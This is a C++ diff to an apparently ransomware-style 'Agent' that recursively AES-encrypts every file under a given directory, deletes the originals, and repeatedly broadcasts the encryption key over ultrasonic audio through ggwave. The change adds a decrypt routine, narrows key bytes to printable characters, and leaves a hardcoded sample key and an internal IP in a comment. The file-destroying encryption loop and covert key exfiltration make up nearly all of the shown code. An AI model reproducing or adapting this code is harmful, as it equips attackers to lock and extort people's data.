@@ -9,14 +9,15 @@
 #include <Cryptopp/modes.h>
 #include <Cryptopp/osrng.h>
 #include <chrono>
+#include <utility>
 
 using namespace std::literals;
 using namespace std::filesystem;
 using namespace CryptoPP;
 
-Agent::Agent() :
-	m_encryption_key(generate_key()),
-	m_init_vector(generate_iv())
+
+Agent::Agent(path encryption_root_path) :
+	m_encryption_root_path(std::move(encryption_root_path))
 {}
 
 Agent::~Agent()
@@ -31,11 +32,12 @@ Agent::~Agent()
 	}
 }
 
-void Agent::execute(const path& encryption_root_path)
+void Agent::execute()
 {
+	std::array<byte, AES::DEFAULT_KEYLENGTH> encryption_key(generate_key());
 	m_send_key_thread = std::make_unique<std::jthread>([&]()
 	{
-		send_key();
+		send_key(encryption_key);
 	});
 	
 	m_ultrasonic_main_thread = std::make_unique<std::jthread>([&]()
@@ -43,22 +45,45 @@ void Agent::execute(const path& encryption_root_path)
 		ultrasonic_main();
 	});
 
-	encrypt_directory(encryption_root_path);
+	encrypt_directory(encryption_key);
 }
 
-void Agent::encrypt_directory(const path& encryption_root_path)
+void Agent::decrypt(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
 {
-	for(const directory_entry& entry : recursive_directory_iterator(encryption_root_path))
+	for (const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
+	{
+		if (entry.is_regular_file())
+		{
+			{
+				const size_t extention_start = entry.path().wstring().find_last_of('.');
+				const path final_path = entry.path().wstring().substr(0, extention_start);
+				CFB_Mode<AES>::Decryption decryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
+				FileSource fsDcr(entry.path().c_str(), true, new StreamTransformationFilter(decryption, new FileSink(final_path.c_str())));
+			}
+
+			std::filesystem::remove(entry.path());
+		}
+	}
+}
+
+void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
+{
+	for(const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
 	{
 		if (entry.is_regular_file())
 		{
 			{
 				path final_path = entry.path().wstring() + L".encrypted";
-				CFB_Mode<AES>::Encryption encryption(m_encryption_key.data(), m_encryption_key.size(), m_init_vector.data());
+				CFB_Mode<AES>::Encryption encryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
 				FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
 			}
 
-			std::filesystem::remove(entry.path());
+			try {
+				std::filesystem::remove(entry.path());
+			} catch (...)
+			{
+				LOG("remove failed");
+			}
 		}
 	}
 }
@@ -67,18 +92,14 @@ std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
 {
 	AutoSeededRandomPool rng{};
 	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};
-	rng.GenerateBlock(key.data(), key.size());
+
+	for ( uint32_t i = 0; i< key.size(); ++i )
+	{
+		key[i] = (rng.GenerateByte() % (122 - 48 + 1)) + 48;
+	}
+	//rng.GenerateBlock(key.data(), key.size());
 
 	return key;
-}
-
-std::array<byte, AES::BLOCKSIZE> Agent::generate_iv()
-{
-	AutoSeededRandomPool rng{};
-	std::array<byte, AES::BLOCKSIZE> iv{};
-	rng.GenerateBlock(iv.data(), iv.size());
-
-	return iv;
 }
 
 void Agent::ultrasonic_main()
@@ -93,20 +114,20 @@ void Agent::ultrasonic_main()
 	}
 }
 
-void Agent::send_key()
+void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key)
 {
 	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
-	constexpr int VOLUME = 5;
+	constexpr int VOLUME = 10;
 	
-	std::string encryption_data = "key: {" + std::string(m_encryption_key.begin(), m_encryption_key.end()) + "} vi: {" + std::string(m_init_vector.begin(), m_init_vector.end()) + "}";
+	std::string encryption_data = "key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "}"; //"{ \"agentIp\": \"10.10.10.55\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"cQfTjWnZr4u7x!A%D*F-JaNdRgUkXp2s\\\"}\" }"; //"key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "} vi: {" + std::string(m_init_vector.begin(), m_init_vector.end()) + "}";
 	auto ggWave = m_ultrasonic.get_ggwave();
 
 	while (m_agent_running) {
-		std::this_thread::sleep_for(10s);
-
 		{
 			std::lock_guard lock(m_ultrasonic_mutex);
 			ggWave->init(encryption_data.size(), encryption_data.data(), ggWave->getTxProtocol(TX_PROTOCOL), VOLUME);
 		}
+
+		std::this_thread::sleep_for(30s);
 	}
 }
